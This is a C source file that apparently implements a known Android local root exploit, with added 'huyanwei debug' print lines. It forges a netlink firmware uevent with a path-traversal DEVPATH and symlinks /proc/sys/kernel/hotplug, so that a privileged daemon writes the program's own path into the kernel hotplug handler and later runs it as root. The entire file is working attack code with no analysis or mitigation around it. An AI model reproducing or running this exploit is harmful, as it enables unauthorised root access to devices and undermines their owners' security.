
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

int main(int argc, char **argv, char **env)
{
    char buf[512], path[512];
    int ofd;
    struct sockaddr_nl snl;
    struct iovec iov = {buf, sizeof(buf)};
    struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
    int sock;
    char *basedir = NULL;

    /* I hope there is no LD_ bug in androids rtld :) */
    if (geteuid() == 0 && getuid() != 0)
    {
			while(1)
			{
				printf("huyanwei debug root it\n");
				sleep(3);
			}
	}

	memset(buf,0,sizeof(buf));
	memset(path,0,sizeof(path));

    if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
        die("[-] readlink");


	basedir = "/data/local/tmp";
    if (chdir(basedir) < 0)
	{
		basedir = strdup(getcwd(buf, sizeof(buf)));
	}
	
	printf("huyanwei debug basedir = %s\n",basedir);
	printf("huyanwei debug path    = %s\n",path);

    memset(&snl, 0, sizeof(snl));
    snl.nl_pid = getpid();
    snl.nl_family = AF_NETLINK;

    if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
    	die("[-] socket");

	printf("huyanwei debug create firmware state file %s\/loading\n",basedir);
    close(creat("loading", 0666));


	// hotplug 
    if ((ofd = creat("hotplug", 0644)) < 0)
        die("[-] creat");
    if (write(ofd, path , strlen(path)) < 0)
        die("[-] write");
    close(ofd);

	printf("huyanwei debug create firmware data file %s\/data\n",basedir);
    symlink("/proc/sys/kernel/hotplug", "data");

    snprintf(buf, sizeof(buf), 
			"ACTION=add%c"
			"DEVPATH=/..%s%c"
            "SUBSYSTEM=firmware%c"
            "FIRMWARE=../../%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);

    printf("sending sock message ...\n");
    if (sendmsg(sock, &msg, 0) < 0)
        die("[-] sendmsg");

    close(sock);

	return 0;
}
